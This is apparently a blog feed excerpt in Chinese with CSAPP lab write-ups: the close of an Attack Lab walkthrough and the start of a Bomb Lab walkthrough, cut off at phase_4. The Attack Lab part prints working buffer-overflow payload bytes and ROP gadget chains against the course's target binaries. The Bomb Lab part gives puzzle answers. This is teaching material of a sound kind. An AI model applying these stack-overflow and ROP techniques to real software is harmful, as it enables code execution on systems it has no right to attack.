很类似，只不过参数由整数换成了字符串，不过思路都是大抵相同的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">void touch3(char *sval)&#123;    vlevel &#x3D; 3; &#x2F;* Part of validation protocol *&#x2F;    if (hexmatch(cookie, sval)) &#123;    printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    validate(3);    &#125; else &#123;    printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    fail(3);    &#125;    exit(0);&#125;&#x2F;* Compare string to hex represention of unsigned value *&#x2F;int hexmatch(unsigned val, char *sval)&#123;    char cbuf[110];    &#x2F;* Make position of check string unpredictable *&#x2F;    char *s &#x3D; cbuf + random() % 100;    sprintf(s, &quot;%.8x&quot;, val);    return strncmp(sval, s, 9) &#x3D;&#x3D; 0;&#125;</code></pre><p>字符串相较于整数，无外乎多了一层 <strong>indirection</strong> ，也就是指针。我们只需要预先在某个地址 addr 处将字符串数据进行存储，后续将字符串参数设置为 addr 即可，同样，addr 的值可根据相对于栈的偏移量得到。</p><p>注入的代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi   7:   68 fa 18 40 00          pushq  $0x4018fa   c:   c3                      retq </code></pre><p>而字符串 <code>&quot;59b997fa&quot;</code> 的 ASCII 码表示为：<code>35 39 62 39 39 37 66 61 00</code>，最后的 <code>00</code> 表示 NULL，即 C 语言字符串的终结符。</p><p>这里我遇到了一点问题，这是错误的攻击数据：</p><pre class="language-none"><code class="language-none">48 c7 c7 88 dc 61 55 68fa 18 40 00 c3 00 00 00 35 39 62 39 39 37 66 6100 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>上面的答案看似没有问题，但是实际上忽略了很重要的一点，字符串的值存放在 <code>getbuf</code> 的栈帧中（<code>0x5561dc78 ~ 0x5561dc98</code>），在完成字符串正确性检验之前，字符串的值都应该 <strong>保持不变</strong> 。而实际上在函数 <code>getbuf</code> 返回后，它的栈帧空间将会被回收，留给 <code>touch3</code> 和 <code>hexmatch</code> 分配使用，且观察反汇编代码发现分配给 <code>hexmatch</code> 的栈帧空间大于 40 字节，这必然导致 <code>getbuf</code> 栈帧数据被破坏，也就导致了错误。 </p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-1.png" alt></p><p>一种正确的方式是将字符串数据写入 <code>test</code> 栈帧或更高地址处，因为实验只要求成功触发 touch，而并不要求正确返回到之前的调用过程，因此破坏之前的栈帧对结果无影响。</p><pre class="language-none"><code class="language-none">48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 0035 39 62 39 39 37 66 6100</code></pre><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-2.png" alt></p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>后面的两个实验需要攻击程序是 rtarget，相较于 ctarget，它引入了很多安全措施，例如栈随机化、限制可执行代码区域等，因此攻击起来更为困难。</p><p>参考实验手册，其中介绍了一种很有意思的攻击方法：不手动注入代码，而是借助已存在的代码，将其重组为我们需要的攻击代码。其中，一个以 <code>ret</code> 指令结束的指令序列，称之为一个 gadget，一连串的 gadget 被调用将会产生等价于代码注入的效果。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p4-1.png" alt></p><p>想法很美好，但是实施起来的过程还是比较痛苦的，要想组合出有效的 gadget，需要仔细对照指令的字节表示和 <code>farm</code> 的反汇编代码，这部分我也是大量 <del>抄袭了</del> 参考了其他人的做法。</p><p>一种正确的 gadget 组合如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019c5 &lt;setval_426 + 2&gt;:48 89 c7  movq %rax,%rdi90        nopc3  ret</code></pre><p>返回地址为 <code>0x4019ab</code>，即 gadget1 的起始地址，然后栈中从低到高依次存放：cookie 的值、gadget2 的起始地址、<code>touch2</code> 的起始地址。 </p><blockquote><p>这里要注意出栈是从低地址向高地址方向，与入栈相反。</p></blockquote><p>最终的攻击数据如下：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00c5 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00</code></pre><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>最后 phase_5 的 gadget 构造非常复杂（官解是用了 8 个），在 CMU 的实验中也是属于选做的部分，完成前四个已经有 95 分了，因此这里也只介绍一些问题和思路。</p><p>前面提到，rtarget 引入了栈随机化，这会带来的问题是：在指定参数 sval 时，无法显式地指定地址，而需要依靠间接寻址，即栈指针 <code>%rsp</code> 加上一个相较于它的偏移量。我们可以先确定哪条指令根据栈指针的值计算字符串参数，记录下它的位置和字符串存放位置的偏移量，作为数据一并存入栈中，后续再取出进行计算。</p><p>以下是一种正确的 gadget 实现：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019dd &lt;getval_481 + 2&gt;:89 c2   movl %eax,%edx90nopc3ret# gadget30000000000401a69 &lt;getval_481 + 1&gt;:89 d1   movl %edx,%ecx08 dborb  %bl,%blc3ret# gadget40000000000401a13 &lt;addval_436 + 2&gt;:89 ce   movl %ecx,%esi90nop90nopc3ret# gadget50000000000401aad &lt;setval_350 + 2&gt;:48 89 e0  movq %rsp,%rax90  nopc3  ret# gadget600000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret# gadget700000000004019d6 &lt;add_xy&gt;:48 8d 04 37  lea  (%rdi,%rsi,1),%raxc3 ret# gadget800000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret</code></pre><p>攻击数据的构造和 phase_4 很类似，就不过多赘述了。</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 0020 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 &lt;strong&gt;缓冲区溢出漏洞&lt;/strong&gt; 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/</id>
    <published>2024-09-17T03:45:11.000Z</published>
    <updated>2024-09-19T06:46:56.785Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏关卡，每个关卡都分别考察了一种语法结构或数据结构的汇编表示，部分关卡逻辑比较复杂，要求对 x86 汇编有一定的熟悉度。</p><h1 id="bomb-c"><a href="#bomb-c" class="headerlink" title="bomb.c"></a>bomb.c</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">;</span>    <span class="token comment">/* Note to self: remember to port this bomb to Windows and put a     * fantastic GUI on it. */</span>    <span class="token comment">/* When run with no arguments, the bomb reads its input lines     * from standard input. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        infile <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* When run with one argument &lt;file>, the bomb reads from &lt;file>     * until EOF, and then switches to standard input. Thus, as you     * defuse each phase, you can add its defusing string to &lt;file> and     * avoid having to retype it. */</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>infile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Error: Couldn't open %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* You can't call the bomb with more than 1 command line argument. */</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s [&lt;input_file>]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span>    <span class="token function">initialize_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"which to blow yourself up. Have a nice day!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Hmm...  Six phases must be more secure than one phase! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">/* Get input                   */</span>    <span class="token function">phase_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* Run the phase               */</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* Drat!  They figured it out!                                      * Let me know how they did it. */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Phase 1 defused. How about the next one?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* The second phase is harder.  No one will ever figure out     * how to defuse this... */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_2</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That's number 2.  Keep going!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* I guess this is too easy so far.  Some more complex code will     * confuse people. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_3</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Halfway there!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_4</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So you got that one.  Try this one.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_5</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good work!  On to the next...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* This phase will never be used, since no one will get past the     * earlier ones.  But just in case, make this one extra hard. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_6</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Wow, they got it!  But isn't something... missing?  Perhaps     * something they overlooked?  Mua ha ha ha ha! */</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>首先观察 <code>bomb.c</code> 的 main 函数结构，最开始判断 argc 是否为 1，如果为 1，表示运行 bomb 程序时没有指定命令行参数，即从标准输入中读取 “拆弹密码”；否则，从指定的文件中读取。为了后续调试的方便，可以将所有的密码写入一个文件 <code>ans.txt</code> 中，后续在启动 bomb 程序时对其指定：<code>./bomb ans.txt</code>.</p><p>随后便是初始化“炸弹”，每次读取一行密码，利用该密码进行“拆弹”，如果正确，则进入下一关卡，否则，“炸弹”就会爆炸，“拆弹”失败。一次性输对 6 个密码后，“炸弹”就会被“拆除”。</p><p>注意最后的注释：</p><blockquote><p>Wow, they got it!  But isn’t something… missing?  Perhaps something they overlooked?  Mua ha ha ha ha!</p></blockquote><p>一定程度上暗示了隐藏关卡的存在。</p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>每次拆弹时，可以使用 <code>disas</code> 命令进行反汇编，查看函数对应的汇编代码，以下是 <code>disas phase_1</code> 的结果：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp0x0000000000400efb &lt;+27&gt;:    ret</code></pre><p>热身关卡，代码的逻辑很简单，读取一行密码，判断该密码与事先指定的字符串是否相同，如果不相同，则“引爆炸弹”。</p><p>这里需要熟悉 x86 寄存器的使用惯例（也可以 GDB 自行调试），寄存器 <code>%rdi</code> 寄存器 <code>%rsi</code> 分别作为函数调用时的参数 1 和参数 2。在这里，<code>%rdi</code> 存储着读取到的密码字符串（准确来说，是字符串首字母的地址），而 <code>%rsi</code> 则被赋值为 <code>0x402400</code>，然后，将这两个地址作为参数 1 和参数 2，调用 <code>string_not_equal</code>，从函数名称上看，该函数用来判定两个字符串是否相同。那么思路就很清晰了，密码就是地址 <code>0x402400</code> 处的字符串值，使用 <code>x/s 0x402400</code> 查看即可。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p1.png" alt></p><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp0x0000000000400efd &lt;+1&gt;:     push   %rbx0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp0x0000000000400f40 &lt;+68&gt;:    pop    %rbx0x0000000000400f41 &lt;+69&gt;:    pop    %rbp0x0000000000400f42 &lt;+70&gt;:    ret</code></pre><p>这一关主要是考察 <strong>循环语句</strong> ，可以仔细阅读书中第 3.6.7 节，加强对汇编的循环结构的熟悉程度，如果感觉思路很乱，可以采用与书中类似的方法：先将汇编翻译为等价的带 goto 的高级语言，再参考几种典型的循环形式，将 goto 改写为循环结构，以下便是最终翻译得到的类 C 语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_six_numbers();if (Mem[%rsp] !&#x3D; 1) &#123;    explode_bomb();&#125;for (%rbx &#x3D; %rsp + 4, %rbp &#x3D; %rsp + 24; %rbx !&#x3D; %rbp; %rbx +&#x3D; 4) &#123;    %eax &#x3D; Mem[%rbx - 4];  &#x2F;&#x2F; 上一个元素    %eax *&#x3D; 2;    if (Mem[%rbx] !&#x3D; %eax) &#123;        explode_bomb();    &#125;&#125;</code></pre><p>首先注意到 <code>read_six_numbers()</code> 函数，字面意思是读取 6 个数字，推测密码由 6 个数字组成。</p><p>然后判断 <code>Mem[%rsp]</code> 的值是否为 1，不是则“爆炸”。这里可以善用 GDB，先随便蒙 6 个数字，然后使用 <code>p/x</code> 打印 <code>Mem[%rsp]</code> 的值，发现其值正好等于输入的第一个数字，结合后面的 6 次循环可知，输入的第 i （i 从 0 开始）个数字存储在地址 <code>%rsp + 4 * i</code> 处，且每个数字都必须为它前一个数字的两倍。</p><p>那么代码逻辑便理清楚了：输入的第一个数字为 1，其后每一个数字都为前一个数字的两倍，密码为：<code>1 2 4 8 16 32</code>.</p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp0x0000000000400fcd &lt;+138&gt;:   ret</code></pre><p>这一关的代码量比较大，但是中间一段看起来很有规律，尤其注意这一句：<code>jmp  *0x402470(, %rax, 8)</code>，直接根据 <code>%rax</code> 寄存器的值计算偏移量进行跳转，这便是 <strong>switch 语句</strong> 所采用的跳转方式，地址 <code>0x402470</code> 即跳转表的首地址。</p><p>另外，还需要关注的一条指令是 <code>call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</code>，貌似是一个函数调用指令，以下是我借助大语言模型得到的解释：</p><blockquote><p><code>__isoc99_sscanf@plt</code> 是一个指向 <code>sscanf</code> 函数的 PLT（Procedure Linkage Table）入口点的符号引用。<code>sscanf</code> 函数是 C 语言标准库中的一个函数，用于从输入流中按照指定格式读取数据。<code>@plt</code> 表示这是一个通过动态链接的程序跳转表（Procedure Linkage Table）来调用的函数。</p><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>在 x86-64 架构中，函数参数通常是通过寄存器传递的。对于 <code>sscanf</code> 函数，它的参数如下：</p><ul><li><code>%rdi</code>：第一个参数，通常是文件描述符或指针类型。对于 <code>sscanf</code>，这是指向输入字符串的指针。</li><li><code>%rsi</code>：第二个参数，指向格式化字符串的指针。</li><li><code>%rdx</code>：第三个参数，如果有的话，指向第一个要填充的变量的地址。</li><li>更多的参数会继续使用后续的寄存器 <code>%rcx</code>, <code>%r8</code>, 和 <code>%r9</code>。如果参数超过六个，那么它们将会通过栈传递。</li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>在 x86-64 架构中，返回值会被放在 <code>%rax</code> 寄存器中。<code>sscanf</code> 返回成功匹配和赋值的项数，如果没有任何匹配，则返回零。如果输入结束前格式化字符串就被耗尽了，也返回零。如果遇到任何读取错误（如读取一个整数但输入不是有效的整数），则返回负数。</p></blockquote><p>简而言之，<code>sscanf</code> 类似于 <code>scanf</code>，只是输入从标准输入变成了指定的字符串。在这里，<code>sscanf</code> 指定了 4 个参数，作用为：从 <code>%rdi</code> 寄存器指向的字符串中进行读取，<code>%rsi</code> 指向格式化字符串，<code>%rdx</code> 和 <code>%rcx</code> 分别指向被格式化读取到的变量 1 和变量 2. 若读取成功，则返回成功读取的项数，即为 2，存入 <code>%rax</code> 寄存器中。</p><p>查看 <code>0x4025cf</code> 处的字符串，即格式化字符串，为 <code>%d %d</code>，说明读取的两个值都为十进制整数，即本关密码的形式。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3.png" alt></p><p>最后查看一下整张跳转表的值，根据最终跳转到的位置确定输入的值。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3-2.png" alt></p><p>然后将其改写为 switch 语句，下面直接给出完整代码的翻译结果：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax &lt;&#x3D; 1) &#123;          &#x2F;&#x2F; 读取成功的值个数小于2    explode_bomb();&#125;if (Mem[%rsp + 8] &gt; 7u) &#123; &#x2F;&#x2F; 读取到的（输入的）第一个值大于7或小于0    explode_bomb();&#125;%eax &#x3D; Mem[%rsp + 8];switch (%rax) &#123;    case 0:        %eax &#x3D; 0xcf;  break;    case 1:        %eax &#x3D; 0x137; break;    case 2:        %eax &#x3D; 0x2c3; break;    case 3:        %eax &#x3D; 0x100; break;    case 4:        %eax &#x3D; 0x185; break;    case 5:        %eax &#x3D; 0xce;  break;    case 6:        %eax &#x3D; 0x2aa; break;    case 7:    %eax &#x3D; 0x147; break;&#125;&#x2F;&#x2F; 输入的第二个值等于%eax寄存器的值if (%eax !&#x3D; Mem[%rsp + 12]) &#123;    explode_bomb();&#125;</code></pre><p>要使得 <code>%eax</code> 的值等于输入的第二个值，只需要保证输入的第一个值经过 switch 语句选择之后，赋值正好等于输入的第二个值。</p><p>因此本关的答案并不是固定的，<code>0 207</code>、 <code>3 256</code> 等等都是正确答案。注意不能写成 <code>0 0xcf</code>、<code>3 0x100</code>，因为输入格式为十进制整数，需要将十六进制进行转换。</p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;:    cmpl   